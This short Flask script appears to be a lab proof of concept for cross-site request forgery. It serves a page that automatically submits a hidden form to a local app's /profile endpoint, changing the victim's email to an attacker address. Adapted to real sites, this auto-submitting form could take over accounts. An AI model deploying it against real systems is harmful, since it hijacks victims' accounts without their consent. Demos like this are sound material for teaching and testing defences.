from flask import Flask

app = Flask(__name__)


@app.route("/")
def attacker_page():
    return """
    <h1>Test Page</h1>

    <p>This page simulates an attacker-controlled website.</p>

    <form id="csrfForm"
          action="http://127.0.0.1:5000/profile"
          method="POST">

        <input type="hidden"
               name="email"
               value="attacker@example.com">

    </form>

    <script>
        document.getElementById("csrfForm").submit();
    </script>
    """


if __name__ == "__main__":
    app.run(port=5001)